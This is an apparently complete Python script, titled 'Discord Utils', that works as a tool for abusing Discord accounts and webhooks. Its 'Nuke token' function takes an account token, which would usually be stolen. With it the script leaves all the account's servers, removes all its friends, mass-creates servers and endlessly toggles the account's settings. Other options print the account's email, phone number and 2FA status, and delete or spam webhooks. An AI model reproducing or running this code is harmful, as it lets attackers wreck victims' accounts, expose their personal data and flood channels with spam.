import requests
import json
import discord
import threading
import os
import time
import json
import requests 
import random
from colorama import Fore, init
from itertools import cycle
init(convert=True)

guildsIds = []
friendsIds = []

class Login(discord.Client):
    async def on_connect(self):
        for g in self.guilds:
            guildsIds.append(g.id)
 
        for f in self.user.friends:
            friendsIds.append(f.id)

        await self.logout()

    def run(self, token):
        try:
            super().run(token, bot=False)
        except Exception as e:
            print("Token invalid. Error:", e)
            input("Press any key to exit...\n> ")

def tokenNuker(token):
    headers = {'Authorization': token}
    guildname = input("Guild name: ")
    print("Nuking...")

    for guild in guildsIds:
        requests.delete(f'https://discord.com/api/v6/users/@me/guilds/{guild}', headers=headers)

    for friend in friendsIds:
        requests.delete(f'https://discord.com/api/v6/users/@me/relationships/{friend}', headers=headers)
    
    for i in range(50):
        payload = {'name': f'{guildname} {i}', 'region': 'russia', 'icon': None, 'channels': None}
        requests.post('https://discord.com/api/v6/guilds', headers=headers, json=payload)
        print(f'[+] A discord server was created. Total: {i}')

    modes = cycle(["light", "dark"])
    while True:
        setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'ru'])}
        requests.patch("https://discord.com/api/v6/users/@me/settings", headers=headers, json=setting)

def tokenInfo(token):
    print('[TOKEN INFO]')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
            userName = r.json()['username'] + '#' + r.json()['discriminator']
            userID = r.json()['id']
            phone = r.json()['phone']
            email = r.json()['email']
            locale = r.json()['locale']
            mfa = r.json()['mfa_enabled']
            avatarurl = r.json()['avatar']
            if avatarurl == None:
                stringava = 'None'
            else:
                stringava = f'''https://cdn.discordapp.com/avatars/{userID}/{avatarurl}.png?size=128'''
            print(r.text)
            flags = r.json()['public_flags']
            public_flag = "None"
            if flags == 64:
                public_flag = "HypeSquad Bravery"
            if flags == 128:
                public_flag = "HypeSquad Brilliance"
            if flags == 256:
                public_flag = "HypeSquad Balance"
            print(f'''
[{Fore.RED}User Name{Fore.RESET}]: {userName}
[{Fore.RED}Email{Fore.RESET}]: {email}
[{Fore.RED}Badges{Fore.RESET}]: {public_flag}
[{Fore.RED}Locale{Fore.RESET}]: {locale}
[{Fore.RED}Phone number{Fore.RESET}]: {phone if phone else "none"}
[{Fore.RED}User ID{Fore.RESET}]: {userID}
[{Fore.RED}2 Factor{Fore.RESET}]: {mfa}
[{Fore.RED}Avatar URL{Fore.RESET}]: {stringava}
[{Fore.RED}Token{Fore.RESET}]: {token}
            ''')
            input()
def idInfo(token, userid):
    print('[ID INFO]')
    headers = {'Authorization': 'Bot ' + token}
    r = requests.get(f'https://discord.com/api/v6/users/{userid}', headers=headers)
    if r.status_code == 200:
        userName = r.json()['username'] + '#' + r.json()['discriminator']
        badge = r.json()['public_flags']
        avatar = r.json()['avatar']
        print(f'[{Fore.RED}Username{Fore.RESET}]: {userName}')
        print(f'[{Fore.RED}Avatar{Fore.RESET}]: https://cdn.discordapp.com/avatars/{userid}/{avatar}')
        if badge == 64:
            print(f'[{Fore.RED}Bages{Fore.RESET}]: HypeSquad Bravery')
        elif badge == 128:
            print(f'[{Fore.RED}Bages{Fore.RESET}]: HypeSquad Brilliance')
        elif badge == 256:
            print(f'[{Fore.RED}Bages{Fore.RESET}]: HypeSquad Balance')
        else:
            print(f'[{Fore.RED}Bages{Fore.RESET}]: None')


banner = """
██████╗░██╗░██████╗░█████╗░░█████╗░██████╗░██████╗░  ██╗░░░██╗████████╗██╗██╗░░░░░░██████╗
██╔══██╗██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗  ██║░░░██║╚══██╔══╝██║██║░░░░░██╔════╝
██║░░██║██║╚█████╗░██║░░╚═╝██║░░██║██████╔╝██║░░██║  ██║░░░██║░░░██║░░░██║██║░░░░░╚█████╗░
██║░░██║██║░╚═══██╗██║░░██╗██║░░██║██╔══██╗██║░░██║  ██║░░░██║░░░██║░░░██║██║░░░░░░╚═══██╗
██████╔╝██║██████╔╝╚█████╔╝╚█████╔╝██║░░██║██████╔╝  ╚██████╔╝░░░██║░░░██║███████╗██████╔╝
╚═════╝░╚═╝╚═════╝░░╚════╝░░╚════╝░╚═╝░░╚═╝╚═════╝░  ░╚═════╝░░░░╚═╝░░░╚═╝╚══════╝╚═════╝░
"""
os.system('cls' if os.name == 'nt' else 'clear')
print(banner)
selmain = int(input("Select an action:\n| 1 - Webhooks\n| 2 - Tokens\n| 3 - DiscordID Info\n> "))
while 1:
    if selmain == 1:
        while 1:
            try:
                selweb = int(input("Select an action:\n| 1 - Delete the webhook\n| 2 - Information about the webhook\n| 3 - Start spamming the webhook\n> "))
                if selweb == 1:
                    delweb = input("URL to the webhook: \n> ")
                    requests.delete(delweb)
                    print("Webhook successfully deleted!")
                elif selweb == 2:
                    infowebs = input("URL to the webhook: \n> ")
                    weburl = requests.get(infowebs).text
                    webinfoj = json.loads(weburl)
                    try:
                        name = webinfoj['name']
                        wid = webinfoj['id']
                        avatar = webinfoj['avatar']
                        guild = webinfoj['guild_id']
                        channel = webinfoj['channel_id']
                        token = webinfoj['token']
                        avatart = webinfoj['avatar']
                        avaurl = f'''https://cdn.discordapp.com/avatars/{wid}/{avatar}.webp?size=128'''
                        print('[WEBHOOK INFO]')
                        print(f'''
    [{Fore.RED}Name{Fore.RESET}]: {name}
    [{Fore.RED}Id{Fore.RESET}]: {wid}
    [{Fore.RED}Avatar{Fore.RESET}]: {avaurl}
    [{Fore.RED}Guild ID{Fore.RESET}]: {guild}
    [{Fore.RED}Channel ID{Fore.RESET}]: {channel}
    [{Fore.RED}Token{Fore.RESET}]: {token}
                        ''')
                    except KeyError:
                        print("This webhook doesn't exist!")
                elif selweb == 3:
                    x = 0
                    spamurl = str(input("URL to the webhook: \n> "))
                    spamusername = str(input("Name for the webhook: \n> "))
                    spamavatar = str(input("Avatar url (leave it empty if you don't need it): \n> "))
                    spamcontent = str(input("The content of the messages\n> "))
                    spamlimit = int(input("Number of messages: \n> "))
                    spamdelay = int(input("Pause between messages (0 by default): \n> "))
                    while x < spamlimit:
                            try:
                                if spamdelay != '':
                                    if spamdelay > 0:
                                        time.sleep(spamdelay)
                                    else:
                                        time.sleep(0)
                                else:
                                    time.sleep(0)
                                payload = {"content":spamcontent,"username":spamusername,"avatar_url":spamavatar}
                                r = requests.post(spamurl,data=payload)
                                x +=1
                                print("[+] The message is sent... Total sent: " + str(x)) 
                            except:
                                print("[-] Error!!")
                                pass 
                    print("All the messages have been sent")
            except ValueError:
                print("")
    elif selmain == 2:
            while 1:
                try:
                    seltok = int(input("Select an action:\n| 1 - Token Information\n| 2 - Nuke token\n>"))
                    if seltok == 1:
                        inputtoken = input("Enter the token: ")
                        tokenInfo(inputtoken)
                    elif seltok == 2:
                        print("Account token: ", end=''); token = input('  :  ')
                        print('Threads amount (number): ', end=''); threads = input('  :  ')
                        Login().run(token)
                        if threading.active_count() < int(threads):
                            t = threading.Thread(target=tokenNuker, args=(token, ))
                            t.start()
                except ValueError:
                    print("")
    elif selmain == 3:
        bottoken = input("Enter the bot token: ") # To use this feature you will need a discord bot token.
        check = len(bottoken)
        if check != 59:
            print("Invalid Token Format")
        elif check == 59:
            userid = input("Enter user id: ")
            check = len(userid)
            if check != 18:
                print("Invalid ID Format")
            else:
                idInfo(bottoken, userid)
